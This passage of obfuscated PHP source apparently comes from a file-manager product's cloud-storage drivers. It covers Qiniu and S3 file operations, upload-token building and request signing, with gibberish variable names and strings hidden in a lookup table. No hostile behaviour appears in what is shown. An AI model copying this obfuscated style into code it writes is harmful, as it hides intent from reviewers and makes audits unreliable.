($this->_isFolder($¢¸¿š±×)) { return $this->getPathOuter($¢¸¿š±×); } $¼›’ò™– = $¢¸¿š±× . $¹·¬ëÕ¤[8]; $ÀÈ’»ü = get_path_this($¢¸¿š±×); $²¨ Â€Ä = $¼›’ò™– . $ÀÈ’»ü; if (!$this->mkfile($²¨ Â€Ä)) { return !1; } if (!$this->moveFile($²¨ Â€Ä, $¼›’ò™–)) { $this->delFile($²¨ Â€Ä); return !1; } return $this->getPathOuter($¢¸¿š±×); } public function copyFile($©Š†Ù…, $¶ÒÖúÒ£) { $È¹Ÿœà¬ = $this->bucketManager->copy($this->bucket, $©Š†Ù…, $this->bucket, $¶ÒÖúÒ£, !0); return $È¹Ÿœà¬ ? !1 : $this->getPathOuter($¶ÒÖúÒ£); } public function moveFile($üÉğÔ˜Ş, $åñ˜¹†¸) { $„İµ…Ë… = $this->bucketManager->move($this->bucket, $üÉğÔ˜Ş, $this->bucket, $åñ˜¹†¸, !0); return $„İµ…Ë… ? !1 : $this->getPathOuter($åñ˜¹†¸); } public function delFile($ÎµœÑú) { if (!$this->exist($ÎµœÑú)) { return !0; } $Èº‡™‹ò = $this->bucketManager->delete($this->bucket, $ÎµœÑú); return $Èº‡™‹ò ? !1 : !0; } public function delFolder($¤Ùó¿¦¿) { $¢­¹Ä¶“ =& $_SERVER[Ãìšã«™]; if (!$this->exist($¤Ùó¿¦¿)) { return !0; } $this->listItemCache = !1; $‡‘â–°× = $this->fileList($¤Ùó¿¦¿); $this->listItemCache = !0; $˜‰ª›çÎ = trim($¤Ùó¿¦¿, $¢­¹Ä¶“[8]) . $¢­¹Ä¶“[8]; if (!empty($¤Ùó¿¦¿) && $¤Ùó¿¦¿ !== $¢­¹Ä¶“[190] && !in_array($˜‰ª›çÎ, $‡‘â–°×[$¢­¹Ä¶“[77]])) { $‡‘â–°×[$¢­¹Ä¶“[77]][] = $˜‰ª›çÎ; } $­Áìèä = $this->delByBatch($‡‘â–°×[$¢­¹Ä¶“[76]]); if (!$­Áìèä) { return !1; } $­Áìèä = $this->delByBatch($‡‘â–°×[$¢­¹Ä¶“[77]]); if (!$­Áìèä) { return !1; } return $this->delFile($˜‰ª›çÎ); } private function delByBatch($ÀŠô¯) { foreach (array_chunk($ÀŠô¯, 1000) as $ç¶Ùç») { $ÜÔ—‹Ç¼ = $this->bucketManager->buildBatchDelete($this->bucket, $ç¶Ùç»); list($áØï›†¢, $Ùƒá“­í) = $this->bucketManager->batch($ÜÔ—‹Ç¼); if ($Ùƒá“­í) { return !1; } } return !0; } public function rename($ªå‡é”ù, $©ÅêŒ—¦) { return $this->renameObject($ªå‡é”ù, $©ÅêŒ—¦); } public function fileInfo($Ïç÷î×º, $½ÖÉÖóÅ = false, $“ä¡Œ™Õ = array()) { $Ù¢¯ ¢· =& $_SERVER[Ãìšã«™]; $‚“Ò¾“ç = array($Ù¢¯ ¢·[32] => $this->pathThis($Ïç÷î×º), $Ù¢¯ ¢·[78] => $this->getPathOuter($Ù¢¯ ¢·[8] . $Ïç÷î×º), $Ù¢¯ ¢·[33] => $Ù¢¯ ¢·[192], $Ù¢¯ ¢·[80] => isset($“ä¡Œ™Õ[$Ù¢¯ ¢·[1421]]) ? $“ä¡Œ™Õ[$Ù¢¯ ¢·[1421]] : 0, $Ù¢¯ ¢·[167] => $this->ext($Ïç÷î×º)); if ($½ÖÉÖóÅ) { return $‚“Ò¾“ç; } $‚“Ò¾“ç[$Ù¢¯ ¢·[193]] = $‚“Ò¾“ç[$Ù¢¯ ¢·[86]] = 0; $‚“Ò¾“ç[$Ù¢¯ ¢·[194]] = $‚“Ò¾“ç[$Ù¢¯ ¢·[195]] = !0; if (empty($“ä¡Œ™Õ)) { $“ä¡Œ™Õ = $this->objectMeta($Ïç÷î×º); if (!$“ä¡Œ™Õ) { return $‚“Ò¾“ç; } } if (isset($“ä¡Œ™Õ[$Ù¢¯ ¢·[1422]])) { $‚“Ò¾“ç[$Ù¢¯ ¢·[86]] = substr($“ä¡Œ™Õ[$Ù¢¯ ¢·[1422]] . $Ù¢¯ ¢·[12], 0, 10); } if (isset($“ä¡Œ™Õ[$Ù¢¯ ¢·[1421]])) { $‚“Ò¾“ç[$Ù¢¯ ¢·[80]] = $“ä¡Œ™Õ[$Ù¢¯ ¢·[1421]]; } return $‚“Ò¾“ç; } public function folderInfo($»­ˆÀ¸´, $ö£–äÓÀ = false) { $Ğ¢û‘ü =& $_SERVER[Ãìšã«™]; $¡”¾Ïí = array($Ğ¢û‘ü[32] => $this->pathThis($»­ˆÀ¸´), $Ğ¢û‘ü[78] => $this->getPathOuter($Ğ¢û‘ü[8] . $»­ˆÀ¸´), $Ğ¢û‘ü[33] => $Ğ¢û‘ü[79]); if ($ö£–äÓÀ) { return $¡”¾Ïí; } $¡”¾Ïí[$Ğ¢û‘ü[193]] = $¡”¾Ïí[$Ğ¢û‘ü[86]] = 0; $¡”¾Ïí[$Ğ¢û‘ü[194]] = $¡”¾Ïí[$Ğ¢û‘ü[195]] = !0; $»­ˆÀ¸´ = rtrim($»­ˆÀ¸´, $Ğ¢û‘ü[8]) . $Ğ¢û‘ü[8]; $’½¨óÀ = $this->objectMeta($»­ˆÀ¸´); if (isset($’½¨óÀ[$Ğ¢û‘ü[1422]])) { $¡”¾Ïí[$Ğ¢û‘ü[86]] = substr($’½¨óÀ[$Ğ¢û‘ü[1422]] . $Ğ¢û‘ü[12], 0, 10); } return $¡”¾Ïí; } public function listPath($½ïú½¹û, $Õ´‡›Á¬ = false) { $œÂæğ =& $_SERVER[Ãìšã«™]; $¾âí»Ø÷ = $this->fileList($½ïú½¹û, $œÂæğ[8], !0); foreach ($¾âí»Ø÷[$œÂæğ[77]] as $öŠéıá => $ƒşÄá°È) { $¾âí»Ø÷[$œÂæğ[77]][$öŠéıá] = $this->folderInfo($ƒşÄá°È, $Õ´‡›Á¬); } foreach ($¾âí»Ø÷[$œÂæğ[76]] as $öŠéıá => $ƒşÄá°È) { $¾âí»Ø÷[$œÂæğ[76]][$öŠéıá] = $this->fileInfo($ƒşÄá°È[$œÂæğ[95]], $Õ´‡›Á¬, $ƒşÄá°È); } return $¾âí»Ø÷; } public function has($æî¢é€, $õÔğóÂ€ = false, $±½ÏìØ„ = true) { $ş½éÕ·Õ =& $_SERVER[Ãìšã«™]; $æî¢é€ = trim($æî¢é€, $ş½éÕ·Õ[8]); $Íüö±È¼ = empty($æî¢é€) && $æî¢é€ !== $ş½éÕ·Õ[190] ? $ş½éÕ·Õ[12] : $æî¢é€ . $ş½éÕ·Õ[8]; $Õ«Šüí = $ş½éÕ·Õ[12]; $şˆğö› = 500; $ú¾×ñ = $ş½éÕ·Õ[8]; $ÕŸŸ™´¡ = $ç‚Ğ‡Óê = 0; while (!0) { check_abort(); list($ìáâòÏ, $Œ¶÷ú¥) = $this->bucketManager->listFiles($this->bucket, $Íüö±È¼, $Õ«Šüí, $şˆğö›, $ú¾×ñ); if ($Œ¶÷ú¥) { break; } $Õ«Šüí = array_key_exists($ş½éÕ·Õ[1390], $ìáâòÏ) ? $Õ«Šüí = $ìáâòÏ[$ş½éÕ·Õ[1423]] : $ş½éÕ·Õ[12]; if ($õÔğóÂ€) { if (!empty($ìáâòÏ[$ş½éÕ·Õ[1424]])) { $ÕŸŸ™´¡ += count($ìáâòÏ[$ş½éÕ·Õ[1424]]); } if (!empty($ìáâòÏ[$ş½éÕ·Õ[1425]])) { $ç‚Ğ‡Óê += count($ìáâòÏ[$ş½éÕ·Õ[1425]]); } if ($Õ«Šüí === $ş½éÕ·Õ[12]) { break; } continue; } if ($±½ÏìØ„) { if (!empty($ìáâòÏ[$ş½éÕ·Õ[1424]])) { return !0; } } else { if (!empty($ìáâòÏ[$ş½éÕ·Õ[1425]])) { return !0; } } if ($Õ«Šüí === $ş½éÕ·Õ[12]) { break; } } if ($õÔğóÂ€) { return array($ş½éÕ·Õ[202] => $ÕŸŸ™´¡, $ş½éÕ·Õ[203] => $ç‚Ğ‡Óê); } return !1; } public function listAll($×ÂÜ¶ÀÙ) { $²·®Î¯â =& $_SERVER[Ãìšã«™]; $ÒÄßÕÏ‹ = $this->fileList($×ÂÜ¶ÀÙ, $²·®Î¯â[12], !0); $¨«ì—æÂ = array(); foreach ($ÒÄßÕÏ‹[$²·®Î¯â[76]] as $ñ–©¦ñ©) { $¨«ì—æÂ[$ñ–©¦ñ©[$²·®Î¯â[95]]] = $ñ–©¦ñ©[$²·®Î¯â[80]]; } foreach ($ÒÄßÕÏ‹[$²·®Î¯â[77]] as $ñ–©¦ñ©) { if (is_string($ñ–©¦ñ©)) { $¨«ì—æÂ[$ñ–©¦ñ©] = 0; } } return $this->listAllFiles($×ÂÜ¶ÀÙ, array_keys($¨«ì—æÂ), $¨«ì—æÂ); } private function fileList($şÏÃÎ’¿, $Î²’‚Ğ = '', $àƒï¶Í = 0) { $Ÿø²€øğ =& $_SERVER[Ãìšã«™]; $şÏÃÎ’¿ = trim($şÏÃÎ’¿, $Ÿø²€øğ[8]); $±…şôäŒ = empty($şÏÃÎ’¿) && $şÏÃÎ’¿ !== $Ÿø²€øğ[190] ? $Ÿø²€øğ[12] : $şÏÃÎ’¿ . $Ÿø²€øğ[8]; $ìÈÁıƒ¸ = $Ÿø²€øğ[12]; $Ú ù‡¿§ = 1000; $ÍÕà´¼Œ = $this->listItemCache === !1 ? !1 : !0; $°ƒõœşÕ = $Ş‘Åºù = array(); while (!0) { check_abort(); list($óµ³×Ü¹, $­Ï±¿“) = $this->bucketManager->listFiles($this->bucket, $±…şôäŒ, $ìÈÁıƒ¸, $Ú ù‡¿§, $Î²’‚Ğ); if ($­Ï±¿“) { break; } $ìÈÁıƒ¸ = array_key_exists($Ÿø²€øğ[1390], $óµ³×Ü¹) ? $ìÈÁıƒ¸ = $óµ³×Ü¹[$Ÿø²€øğ[1423]] : $Ÿø²€øğ[12]; $¾¼Äéˆ = isset($óµ³×Ü¹[$Ÿø²€øğ[1424]]) ? $óµ³×Ü¹[$Ÿø²€øğ[1424]] : array(); $±©ÙÌÏ = isset($óµ³×Ü¹[$Ÿø²€øğ[1425]]) ? $óµ³×Ü¹[$Ÿø²€øğ[1425]] : array(); foreach ($¾¼Äéˆ as $É‹ÂÎ) { if ($É‹ÂÎ[$Ÿø²€øğ[95]] == $±…şôäŒ) { continue; } $Œ‰Ğ™îæ = $É‹ÂÎ[$Ÿø²€øğ[95]]; $µ½ÓœÄ» = $É‹ÂÎ[$Ÿø²€øğ[1421]]; $É‹ÂÎ[$Ÿø²€øğ[80]] = $µ½ÓœÄ»; $‹Äíù­Ë = $µ½ÓœÄ» == 0 && substr($Œ‰Ğ™îæ, strlen($Œ‰Ğ™îæ) - 1, 1) == $Ÿø²€øğ[8] ? !0 : !1; if ($ÍÕà´¼Œ) { $this->cacheMethod($Ÿø²€øğ[198], $Œ‰Ğ™îæ, $‹Äíù­Ë); $this->cacheMethod($Ÿø²€øğ[199], $Œ‰Ğ™îæ, $É‹ÂÎ); } if ($‹Äíù­Ë) { $°ƒõœşÕ[] = $Œ‰Ğ™îæ; continue; } $Ş‘Åºù[] = $àƒï¶Í ? $É‹ÂÎ : $Œ‰Ğ™îæ; } foreach ($±©ÙÌÏ as $Œ‰Ğ™îæ) { if ($Œ‰Ğ™îæ == $±…şôäŒ) { continue; } $°ƒõœşÕ[] = $Œ‰Ğ™îæ; if ($ÍÕà´¼Œ) { $this->cacheMethod($Ÿø²€øğ[198], $Œ‰Ğ™îæ, !0); } } if ($ìÈÁıƒ¸ === $Ÿø²€øğ[12]) { break; } } if ($ÍÕà´¼Œ) { $this->cacheMethod($Ÿø²€øğ[198], $şÏÃÎ’¿, !0); } return array($Ÿø²€øğ[77] => $°ƒõœşÕ, $Ÿø²€øğ[76] => $Ş‘Åºù); } public function canRead($ÛøĞæÍÂ) { return $this->exist($ÛøĞæÍÂ) ? !0 : !1; } public function canWrite($ÃÑåñ£) { return $this->exist($ÃÑåñ£) ? !0 : !1; } public function getContent($Ü†®ÂâÊ) { return $this->fileSubstr($Ü†®ÂâÊ, 0, -1); } public function setContent($ÀßÊíÒñ, $°¿Ş¤ºİ = '') { $³®ªÛØ­ = $this->tempFile($this->pathThis($ÀßÊíÒñ)); file_put_contents($³®ªÛØ­, $°¿Ş¤ºİ); if ($this->upload($ÀßÊíÒñ, $³®ªÛØ­)) { $this->tempFileRemve($³®ªÛØ­); return !0; } return !1; } public function refreshUrls($Ü¾ãªƒ³) { $Ç“¼ˆ¯ =& $_SERVER[Ãìšã«™]; $¶ÆòÌ¨˜ = array(); if (is_array($Ü¾ãªƒ³)) { foreach ($Ü¾ãªƒ³ as $ã˜¬Ÿ‡ƒ) { $¶ÆòÌ¨˜[] = $this->link($ã˜¬Ÿ‡ƒ); } } else { $¶ÆòÌ¨˜[] = $this->link($Ü¾ãªƒ³); } $â€øšèÜ = new Qiniu\Cdn\CdnManager($this->auth); list($¼÷Êµ„™, $’œ•Ë¦Œ) = $â€øšèÜ->refreshUrls($¶ÆòÌ¨˜); if ($’œ•Ë¦Œ) { return !1; } return $¼÷Êµ„™[$Ç“¼ˆ¯[1177]] == $Ç“¼ˆ¯[761] ? !0 : !1; } public function fileSubstr($ø¡ò¼×Î, $üö³Ìêğ, $š¼Áû‘) { $ÒòÒ‘ =& $_SERVER[Ãìšã«™]; if (!($°»Çôçö = $this->link($ø¡ò¼×Î))) { return !1; } $«×Á×˜¨ = !1; if ($š¼Áû‘ > 0) { $œ£®¹İª = $üö³Ìêğ + $š¼Áû‘ - 1; $«×Á×˜¨ = array($ÒòÒ‘[1426] . $üö³Ìêğ . $ÒòÒ‘[460] . $œ£®¹İª); } $ØŸº ” = url_request($°»Çôçö, $ÒòÒ‘[225], !1, $«×Á×˜¨); return $ØŸº ”[$ÒòÒ‘[751]] ? $ØŸº ”[$ÒòÒ‘[1187]] : !1; } public function upload($áÁˆäªå, $ÕÊ³›â€, $ÏÆÓ€Œ° = false, $Å‹ÙÔ«â = REPEAT_REPLACE) { $îşÂ›Á² = new Qiniu\Storage\UploadManager(); $ƒ¹§û¬ = $this->auth->uploadToken($this->bucket, $áÁˆäªå); $¬ÖÕ£Éø = get_file_mime(get_path_ext($ÕÊ³›â€)); list($‰¹õ„Öİ, $í¥«¢å) = $îşÂ›Á²->putFile($ƒ¹§û¬, $áÁˆäªå, $ÕÊ³›â€, null, $¬ÖÕ£Éø); return $í¥«¢å ? !1 : $this->getPathOuter($áÁˆäªå); } public function uploadFormData($ßÖÈ¼İ¢, $¹½ÃÑ÷Ç = 3600) { return $this->uploadToken($ßÖÈ¼İ¢, $¹½ÃÑ÷Ç); } public function multiUploadFormData($…­ûÊÜ, $ÂÏœÎ°µ = 3600) { return $this->uploadToken($…­ûÊÜ, $ÂÏœÎ°µ); } private function uploadToken($Ö»Š´, $İ¿ÊôÍ› = 3600) { $¦÷›¿õ =& $_SERVER[Ãìšã«™]; $Ë¡ÍÃ–ª = $İ¿ÊôÍ›; $“ÉÙòİÏ = array($¦÷›¿õ[1427] => $¦÷›¿õ[1428]); $µæçúëŒ = $Ö»Š´; $›Æğç÷Â = $this->auth->uploadToken($this->bucket, $µæçúëŒ, $Ë¡ÍÃ–ª, $“ÉÙòİÏ, !0); $ì‹û…÷ = empty($this->region) || $this->region == $¦÷›¿õ[1429] ? $¦÷›¿õ[12] : $¦÷›¿õ[460] . $this->region; $­¨ÙÒç = http_type() . "\72\x2f\x2f\165\160\154\157\x61\x64{$ì‹û…÷}\56\x71\151\156\x69\165\160\56\x63\x6f\x6d\57"; return array($¦÷›¿õ[1430] => $›Æğç÷Â, $¦÷›¿õ[1431] => $­¨ÙÒç); } public function download($¬×çüƒ“, $ƒş…­š¡) { $¶©àşÚ = IO::getPathInner(IO::mkfile($ƒş…­š¡)); if (!($Ğ×ª”úĞ = $this->link($¬×çüƒ“))) { return !1; } $ƒ¹´›Ä– = 0; $éü«¯é = 1024 * 200; $ëÏğê´ = fopen($¶©àşÚ, $_SERVER[Ãìšã«™][1432]); while (!0) { $ş†ºƒ­™ = $this->fileSubstr($¬×çüƒ“, $ƒ¹´›Ä–, $éü«¯é); if ($ş†ºƒ­™ === !1) { return !1; } fwrite($ëÏğê´, $ş†ºƒ­™); $ƒ¹´›Ä– += $éü«¯é; if (strlen($ş†ºƒ­™) < $éü«¯é) { break; } } fclose($ëÏğê´); return $ƒş…­š¡; } public function link($×ÖË·ñ, $Êû·¿Ü“ = '') { if (!$this->isFile($×ÖË·ñ)) { return !1; } $÷ğøá´£ = $this->getHost() . $_SERVER[Ãìšã«™][8] . $this->pathEncode($×ÖË·ñ) . $Êû·¿Ü“; return $this->auth->privateDownloadUrl($÷ğøá´£, 3600 * 12); } public function fileOut($•™ÀøŠ, $›ÑúÅÂÏ = false, $Î¦Ë›Ü = false, $Çî¤ØˆÊ = '') { $ï•ı™™Ú =& $_SERVER[Ãìšã«™]; if ($this->isFileOutServer()) { return $this->fileOutServer($•™ÀøŠ, $›ÑúÅÂÏ, $Î¦Ë›Ü, $Çî¤ØˆÊ); } if (!$Î¦Ë›Ü) { $Î¦Ë›Ü = $this->pathThis($•™ÀøŠ); } $Âİšı« = $›ÑúÅÂÏ ? $ï•ı™™Ú[1433] . rawurlencode($Î¦Ë›Ü) : $ï•ı™™Ú[12]; $îˆèæÒ‡ = $this->link($•™ÀøŠ, $Âİšı«); $this->fileOutLink($îˆèæÒ‡); } public function fileOutServer($‘è½¡Ó£, $î¦·Ï´Ç = false, $§ùêĞ†¶ = false, $ğˆ¥¨Ëˆ = '') { parent::fileOut($‘è½¡Ó£, $î¦·Ï´Ç, $§ùêĞ†¶, $ğˆ¥¨Ëˆ); } public function fileOutImage($òò•˜¸­, $é‰ÑË¶ = 250) { $üÃ„ï”’ = $this->link($òò•˜¸­, $_SERVER[Ãìšã«™][1434] . $é‰ÑË¶); $this->fileOutLink($üÃ„ï”’); } public function fileOutImageServer($çº‘òŠı, $ôíŸ€²‚ = 250) { parent::fileOutImage($çº‘òŠı, $ôíŸ€²‚); } public function hashMd5($Ğä³‰£) { $¯¬®á“² =& $_SERVER[Ãìšã«™]; $§ùî‘à = $this->objectMeta($Ğä³‰£); return isset($§ùî‘à[$¯¬®á“²[207]]) ? $§ùî‘à[$¯¬®á“²[207]] : !1; $ãÕİØÑ = $this->link($Ğä³‰£, $¯¬®á“²[1435]); } public function size($Ì°Ôü°˜) { $êÑœ±à = $this->objectMeta($Ì°Ôü°˜); return $êÑœ±à ? $êÑœ±à[$_SERVER[Ãìšã«™][80]] : 0; } public function info($ÅÎãúÚ) { if ($this->isFolder($ÅÎãúÚ)) { return $this->folderInfo($ÅÎãúÚ); } else { if ($this->isFile($ÅÎãúÚ)) { return $this->fileInfo($ÅÎãúÚ); } } return !1; } public function exist($¥Â¼›ù÷) { return $this->isFile($¥Â¼›ù÷) || $this->isFolder($¥Â¼›ù÷); } public function isFile($‹²Çğãõ) { return !$this->isFolder($‹²Çğãõ) && $this->objectMeta($‹²Çğãõ); } public function isFolder($¦ƒ¤á©Ç) { return $this->cacheMethod($_SERVER[Ãìšã«™][198], $¦ƒ¤á©Ç); } protected function objectMeta($¹Íœ¡Ûú) { return $this->cacheMethod($_SERVER[Ãìšã«™][199], $¹Íœ¡Ûú); } protected function _objectMeta($ÚàÉòâÇ) { $›Ò¤‚çÂ =& $_SERVER[Ãìšã«™]; list($²îÃ¹à‹, $ï×Ø‰§’) = $this->bucketManager->stat($this->bucket, $ÚàÉòâÇ); if ($²îÃ¹à‹) { $²îÃ¹à‹[$›Ò¤‚çÂ[80]] = intval($²îÃ¹à‹[$›Ò¤‚çÂ[1421]]); } return $²îÃ¹à‹; } protected function _isFolder($†öšÒé) { $û¬ïÒ¶ë =& $_SERVER[Ãìšã«™]; if ($†öšÒé == $û¬ïÒ¶ë[12] || $†öšÒé == $û¬ïÒ¶ë[8]) { return !0; } list($óô­¡, $ÁŸú²¨ ) = $this->bucketManager->listFiles($this->bucket, trim($†öšÒé, $û¬ïÒ¶ë[8]) . $û¬ïÒ¶ë[8], $û¬ïÒ¶ë[12], 1, $û¬ïÒ¶ë[8]); return !empty($óô­¡[$û¬ïÒ¶ë[1424]]) || !empty($óô­¡[$û¬ïÒ¶ë[1425]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ı¢ê¿÷ó) { parent::__construct($ı¢ê¿÷ó); } public function uploadFormData($€éÛÇ¿ô, $ÛŠ÷À‡Ö = 3600) { $Ï‘½‘ÜÍ =& $_SERVER[Ãìšã«™]; $é›º÷‘ = $Ï‘½‘ÜÍ[191]; $½…ÕüÇÙ = $Ï‘½‘ÜÍ[1340]; $Ï‘Î¿ = $Ï‘½‘ÜÍ[62]; $ÆÌ¤ÌŒ³ = gmdate($Ï‘½‘ÜÍ[1341]); $¼“±ÛÓÆ = gmdate($Ï‘½‘ÜÍ[752]); $Æ—Ëüş = $Ï‘½‘ÜÍ[1342]; $‘§ûÍ = $ÛŠ÷À‡Ö . $Ï‘½‘ÜÍ[12]; $ûÙ‚£È = $Ï‘½‘ÜÍ[1304]; $ªÙÎ‹ö = array($this->accessKey, $¼“±ÛÓÆ, $this->region, $Ï‘Î¿, $Æ—Ëüş); $íÔ” ¿ = implode($Ï‘½‘ÜÍ[8], $ªÙÎ‹ö); $îà§ŠÜÉ = array($Ï‘½‘ÜÍ[1306] => gmdate($Ï‘½‘ÜÍ[1305], strtotime($Ï‘½‘ÜÍ[1343])), $Ï‘½‘ÜÍ[1307] => array(array($Ï‘½‘ÜÍ[1309] => $this->bucket), array($Ï‘½‘ÜÍ[1308] => $é›º÷‘), array($Ï‘½‘ÜÍ[1310], $Ï‘½‘ÜÍ[1311], $Ï‘½‘ÜÍ[12]), array($Ï‘½‘ÜÍ[1310], $Ï‘½‘ÜÍ[1344], $Ï‘½‘ÜÍ[12]), array($Ï‘½‘ÜÍ[1310], $Ï‘½‘ÜÍ[1345], $Ï‘½‘ÜÍ[12]), array($Ï‘½‘ÜÍ[1312] => $ûÙ‚£È), array($Ï‘½‘ÜÍ[1346] => $íÔ” ¿), array($Ï‘½‘ÜÍ[1347] => $½…ÕüÇÙ), array($Ï‘½‘ÜÍ[1348] => $ÆÌ¤ÌŒ³), array($Ï‘½‘ÜÍ[1349] => $‘§ûÍ))); $ Ñı‡×³ = base64_encode(json_encode($îà§ŠÜÉ)); $Ì®¥µú = hash_hmac($Ï‘½‘ÜÍ[1350], $¼“±ÛÓÆ, $Ï‘½‘ÜÍ[1351] . $this->secret, !0); $ûÔ¨Şƒƒ = hash_hmac($Ï‘½‘ÜÍ[1350], $this->region, $Ì®¥µú, !0); $’ÉÌÁ­ = hash_hmac($Ï‘½‘ÜÍ[1350], $Ï‘Î¿, $ûÔ¨Şƒƒ, !0); $·²øš±í = hash_hmac($Ï‘½‘ÜÍ[1350], $Æ—Ëüş, $’ÉÌÁ­, !0); $ø€İüÉõ = hash_hmac($Ï‘½‘ÜÍ[1350], $ Ñı‡×³, $·²øš±í); $óê€í = array($Ï‘½‘ÜÍ[210] => $Ï‘½‘ÜÍ[12], $Ï‘½‘ÜÍ[1352] => $Ï‘½‘ÜÍ[12], $Ï‘½‘ÜÍ[1308] => $é›º÷‘, $Ï‘½‘ÜÍ[1312] => $ûÙ‚£È, $Ï‘½‘ÜÍ[1316] => $ Ñı‡×³, $Ï‘½‘ÜÍ[1353] => $íÔ” ¿, $Ï‘½‘ÜÍ[1354] => $½…ÕüÇÙ, $Ï‘½‘ÜÍ[1355] => $ÆÌ¤ÌŒ³, $Ï‘½‘ÜÍ[1356] => $‘§ûÍ, $Ï‘½‘ÜÍ[1357] => $ø€İüÉõ, $Ï‘½‘ÜÍ[174] => $this->getHost()); return $óê€í; } public function multiUploadFormData($»£ê¿÷, $”ÕïÛş” = 3600) { $ö·Û¡² =& $_SERVER[Ãìšã«™]; $†—àÄ‰§ = gmdate($ö·Û¡²[1436]); $Ø³Ç‡ì = array(); $êÂÕ„› = $this->client->getUploadId($this->bucket, $»£ê¿÷, $Ø³Ç‡ì); if (!$êÂÕ„›) { return !1; } return array($ö·Û¡²[218] => $êÂÕ„›, $ö·Û¡²[174] => $this->getHost() . $ö·Û¡²[8] . $this->pathEncode($»£ê¿÷), $ö·Û¡²[219] => $†—àÄ‰§, $ö·Û¡²[95] => $»£ê¿÷); } public function multiUploadAuthData($úıªÒË, $˜¹´óÏÚ = array()) { $İÕÇúµÔ =& $_SERVER[Ãìšã«™]; $¢úèÜ¼õ = isset($˜¹´óÏÚ[$İÕÇúµÔ[167]]) ? $˜¹´óÏÚ[$İÕÇúµÔ[167]] : $İÕÇúµÔ[12]; $–â°Æá¹ = $˜¹´óÏÚ[$İÕÇúµÔ[95]]; unset($˜¹´óÏÚ[$İÕÇúµÔ[95]]); if (isset($˜¹´óÏÚ[$İÕÇúµÔ[220]])) { return $this->listUploadParts($–â°Æá¹, $˜¹´óÏÚ); } $Èƒï«ª¾ = array(); if (isset($˜¹´óÏÚ[$İÕÇúµÔ[1437]])) { $Èƒï«ª¾[$İÕÇúµÔ[1438]] = $˜¹´óÏÚ[$İÕÇúµÔ[1437]]; } $±‚‘åÎ = explode($İÕÇúµÔ[176], $this->getHost()); $Í‚’Óòû = array($İÕÇúµÔ[1439] => $±‚‘åÎ[1], $İÕÇúµÔ[1440] => $İÕÇúµÔ[12], $İÕÇúµÔ[210] => $İÕÇúµÔ[118], $İÕÇúµÔ[1352] => $˜¹´óÏÚ[$İÕÇúµÔ[80]]); $À…”™â¡ = $İÕÇúµÔ[223]; $ÀŒÇ×¼ = $İÕÇúµÔ[8] . $this->pathEncode($–â°Æá¹) . $¢úèÜ¼õ; $®¸üş–é = $this->client->__getSignatureV4($Èƒï«ª¾, $Í‚’Óòû, $À…”™â¡, $ÀŒÇ×¼); if (strpos($¢úèÜ¼õ, $İÕÇúµÔ[222]) === 0) { if (isset($Èƒï«ª¾[$İÕÇúµÔ[1438]])) { $†œß½Ù§ = $Èƒï«ª¾[$İÕÇúµÔ[1438]]; } else { if (isset($®¸üş–é[$İÕÇúµÔ[1438]])) { $†œß½Ù§ = $®¸üş–é[$İÕÇúµÔ[1438]]; } else { $†œß½Ù§ = hash($İÕÇúµÔ[1350], $İÕÇúµÔ[12]); } } return array($İÕÇúµÔ[229] => $®¸üş–é[$İÕÇúµÔ[229]], $İÕÇúµÔ[1438] => $†œß½Ù§, $İÕÇúµÔ[219] => $®¸üş–é[$İÕÇúµÔ[1441]]); } return $®¸üş–é[$İÕÇúµÔ[229]]; } public function listUploadParts($ì×îÑ¹, $ØÌ­æ¹ = array()) { $¼™ŞğŸ× =& $_SERVER[Ãìšã«™]; $Ç¡ŠóÌ = str_replace($¼™ŞğŸ×[230], $¼™ŞğŸ×[12], $ØÌ­æ¹[$¼™ŞğŸ×[167]]); $ÛÚ…òïœ = $this->client->listParts($this->bucket, $ì×îÑ¹, $Ç¡ŠóÌ); if (!$ÛÚ…òïœ) { return !1; } $íìçí¸ˆ = $¼™ŞğŸ×[1442]; foreach ($ÛÚ…òïœ as $ÌïôÎ•›) { $íìçí¸ˆ .= $¼™ŞğŸ×[1443] . "\x3c\x50\141\162\164\116\165\155\x62\145\162\x3e{$ÌïôÎ•›[$¼™ŞğŸ×[1397]]}\74\57\x50\x61\x72\164\116\x75\155\142\x65\162\x3e\12" . "\74\x45\x54\x61\147\x3e{$ÌïôÎ•›[$¼™ŞğŸ×[1398]]}\x3c\x2f\x45\124\141\147\76\12" . $¼™ŞğŸ×[1444]; } $íìçí¸ˆ .= $¼™ŞğŸ×[1445]; $§ùÃÛ˜á = array(); $´œÂµ­€ = explode($¼™ŞğŸ×[176], $this->getHost()); $ˆÔüôê = array($¼™ŞğŸ×[1439] => $´œÂµ­€[1], $¼™ŞğŸ×[210] => $¼™ŞğŸ×[118], $¼™ŞğŸ×[1352] => strlen($íìçí¸ˆ)); $ı†®âûê = $¼™ŞğŸ×[221]; $ŞÌÔ¶É = $¼™ŞğŸ×[8] . $this->pathEncode($ì×îÑ¹) . $ØÌ­æ¹[$¼™ŞğŸ×[167]]; $ìğÕ†ª† = $this->client->__getSignatureV4($§ùÃÛ˜á, $ˆÔüôê, $ı†®âûê, $ŞÌÔ¶É, $íìçí¸ˆ); return array($¼™ŞğŸ×[229] => $ìğÕ†ª†[$¼™ŞğŸ×[229]], $¼™ŞğŸ×[219] => $ìğÕ†ª†[$¼™ŞğŸ×[1441]], $¼™ŞğŸ×[231] => $ÛÚ…òïœ, $¼™ŞğŸ×[1438] => $ìğÕ†ª†[$¼™ŞğŸ×[1438]]); } public function link($Ò‡Ì˜¿÷, $ËÅş£ğÆ = array()) { return parent::link($Ò‡Ì˜¿÷, $ËÅş£ğÆ); } public function fileOut($•ÇŞå®ö, $öÀ¹·õ = false, $ıŒµ¸ê = false, $¥¶üöğ¸ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ãìšã«™][1446])) { return parent::fileOutServer($•ÇŞå®ö, $öÀ¹·õ, $ıŒµ¸ê, $¥¶üöğ¸); } parent::fileOut($•ÇŞå®ö, $öÀ¹·õ, $ıŒµ¸ê, $¥¶üöğ¸); } public function fileOutImage($”ŸÑ®¹, $…ĞÑĞ®É = 250) { if (strstr($this->endpoint, $_SERVER[Ãìšã«™][1446])) { return parent::fileOutImageServer($”ŸÑ®¹, $…ĞÑĞ®É); } parent::fileOutImage($”ŸÑ®¹, $…ĞÑĞ®É); } public function fileOutLink($èß›»û) { $ù¼è¼° =& $_SERVER[Ãìšã«™]; if (substr($èß›»û, 0, 7) == $ù¼è¼°[1319]) { $èß›»û = $ù¼è¼°[1320] . substr($èß›»û, 7); } header($ù¼è¼°[158] . $èß›»û); die; } public function getHost() { 